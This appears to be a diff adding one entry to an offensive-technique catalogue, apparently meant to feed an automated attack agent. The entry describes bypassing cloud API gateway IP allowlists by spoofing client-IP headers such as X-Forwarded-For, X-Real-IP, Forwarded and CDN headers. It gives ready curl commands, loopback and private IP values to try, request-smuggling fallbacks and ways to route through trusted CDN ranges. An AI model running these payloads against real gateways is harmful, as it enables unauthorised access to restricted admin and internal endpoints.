@@ -1,0 +1,24 @@
+[
+  {
+    "id": "cloud-api-gw-header-smuggle",
+    "category": "EXPLOIT",
+    "subcategory": "CLOUD",
+    "title": "API Gateway Header Smuggling — X-Forwarded-For IP Whitelist Bypass",
+    "description": "Cloud API Gateways (AWS API Gateway, Azure API Management, GCP Cloud Endpoints) may use client IP for access control via IP whitelists, checking the X-Forwarded-For header. Attack: (1) Identify the API Gateway endpoint and its IP-based access controls — 403 on restricted endpoints, 200 on public endpoints. (2) Test IP spoofing via headers: curl -H 'X-Forwarded-For: 127.0.0.1' GATEWAY/admin. (3) Try internal/reserved IPs that are commonly whitelisted: 10.0.0.1, 127.0.0.1, ::1 (IPv6 loopback), the gateway's own private IP. (4) Try multiple X-Forwarded-For headers: some proxies use the leftmost (original client), others use the rightmost (last proxy). (5) Try standard proxy headers: X-Real-IP, X-Client-IP, Forwarded (RFC 7239), X-Original-Forwarded-For, X-ProxyUser-IP. (6) If the gateway strips or validates the header, try HTTP request smuggling to bypass header injection. (7) If the gateway trusts an upstream proxy (CDN, WAF), send traffic through that proxy's IP range to appear trusted. (8) Check for header injection via URL parameters: GATEWAY/admin?X-Forwarded-For=127.0.0.1.",
+    "techniques": [
+      "Test with internal IPs: curl -H 'X-Forwarded-For: 127.0.0.1' /admin, curl -H 'X-Forwarded-For: 10.0.0.1' /admin",
+      "Test multiple X-Forwarded-For: curl -H 'X-Forwarded-For: 127.0.0.1, 1.2.3.4' /admin",
+      "Try alternative headers: X-Real-IP: 127.0.0.1, X-Client-IP: 10.0.0.1, Forwarded: for=10.0.0.1",
+      "Try RFC 7239: Forwarded: for=\"[::1]\";proto=https;by=proxy",
+      "Enumerate access: try different internal IP ranges (10., 172.16-31., 192.168., 169.254.)",
+      "Test URL header injection: GET /admin HTTP/1.1 plus X-Forwarded-For in body or query string",
+      "Check for WAF/CDN bypass: use headers accepted by CloudFront, Cloudflare, Akamai (True-Client-IP, CF-Connecting-IP)"
+    ],
+    "indicators": ["API Gateway returning 403 on restricted endpoints", "X-Forwarded-For header reflected in responses or error messages", "IP whitelist documented or discoverable", "No client certificate or mutual TLS required", "CDN or WAF in request path that may add trusted headers"],
+    "prerequisites": ["API Gateway endpoint with IP-based access control on admin/internal endpoints", "Network path that allows direct connection to the gateway (or via VPN)", "Understanding of HTTP proxy header chain semantics"],
+    "tools": ["send_payload", "curl_get", "http_post"],
+    "tags": ["api-gateway", "header-smuggling", "x-forwarded-for", "ip-whitelist", "bypass", "aws", "azure", "gcp"],
+    "confidence": 0.85,
+    "mitre_attack": "T1078"
+  }
+]
